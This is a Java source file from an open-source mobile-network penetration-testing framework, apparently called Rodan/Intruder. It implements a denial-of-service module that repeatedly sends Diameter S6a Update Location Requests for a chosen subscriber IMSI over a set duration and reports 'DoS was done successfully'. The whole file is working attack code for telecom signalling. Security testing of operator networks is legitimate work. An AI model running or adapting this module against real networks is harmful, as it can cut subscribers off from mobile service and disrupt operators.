/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.diameter.usecases.attacks.dos;

import com.rodan.intruder.diameter.entities.event.S6aListener;
import com.rodan.intruder.diameter.entities.event.model.ErrorEvent;
import com.rodan.intruder.diameter.entities.event.model.ResultCode;
import com.rodan.intruder.diameter.entities.event.model.UpdateLocationAnswer;
import com.rodan.intruder.diameter.entities.payload.DiameterPayload;
import com.rodan.intruder.diameter.entities.payload.s6a.UlrPayload;
import com.rodan.intruder.diameter.usecases.attacks.DiameterBruteforceModuleTemplate;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleConstants;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleOptions;
import com.rodan.intruder.diameter.usecases.model.dos.DosAllUlrOptions;
import com.rodan.intruder.diameter.usecases.model.dos.DosAllUlrResponse;
import com.rodan.intruder.diameter.usecases.port.DiameterGateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import com.rodan.intruder.kernel.usecases.model.TimeBasedPayloadCollection;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = DiameterModuleConstants.DOS_ALL_ULR_NAME, category = DiameterModuleConstants.DOS_CATEGORY_DISPLAY_NAME,
        displayName = DiameterModuleConstants.DOS_ALL_ULR_DISPLAY_NAME, brief = DiameterModuleConstants.DOS_ALL_ULR_BRIEF,
        description = DiameterModuleConstants.DOS_ALL_ULR_DESCRIPTION, rank = DiameterModuleConstants.DOS_ALL_ULR_RANK,
        mainPayload = Constants.ULR_PAYLOAD_NAME)
public class DosAllUlrModule extends DiameterBruteforceModuleTemplate implements SignalingModule, S6aListener {
    final static Logger logger = LogManager.getLogger(DosAllUlrModule.class);

    @Builder
    public DosAllUlrModule(DiameterGateway gateway, DiameterModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
        var options = (DosAllUlrOptions) moduleOptions;
        if (!options.getDelayMillis().isBlank()) {
            setBruteforceDelay(Integer.valueOf(options.getDelayMillis()));
        }
        setTaskWaitTime(3000);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (DosAllUlrOptions) moduleOptions;
        var payload = UlrPayload.builder()
                .destinationRealm(options.getDestinationRealm())
                .imsi(options.getImsi()).mcc(options.getMcc()).mnc(options.getMnc())
                .build();

        var payloads = TimeBasedPayloadCollection.<DiameterPayload>builder()
                .duration(Integer.valueOf(options.getDosDuration())).payload(payload)
                .build();

        setPayloadIterator(payloads);
        setMainPayload(payloads.getPayload());
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        getGateway().addS6aListener(this);
    }

    @Override
    protected void waitForResponse() throws SystemException {
        // No need to wait for DoS BF
    }

    @Override
    protected void cleanup() throws SystemException {
        if (this.getGateway() != null)
            this.getGateway().removeS6aListener(this);
    }

    @Override
    public void doUpdateLocationAnswerEvent(UpdateLocationAnswer answer) {
        logger.debug("[[[[ doUpdateLocationAnswerEvent ]]]]");
        logger.debug(answer);

        moduleResponse = DosAllUlrResponse.builder()
                .result("DoS was done successfully")
                .build();
        logger.debug("ULR completed!");
    }

    // Errors should terminate this module since we are not guessing any unknown value
    @Override
    public void onFailedResultCode(ResultCode resultCode) {
        var msg = "Received failed result code: " + resultCode;
        logger.error(msg);
        notify(msg, NotificationType.FAILURE);
        setExecutionError(true);
    }

    @Override
    public void onMessageHandlingError(ErrorEvent errorEvent) {
        logger.error(errorEvent.getMessage());
        notify(errorEvent.getMessage(), NotificationType.FAILURE);
        setExecutionError(true);
    }
}
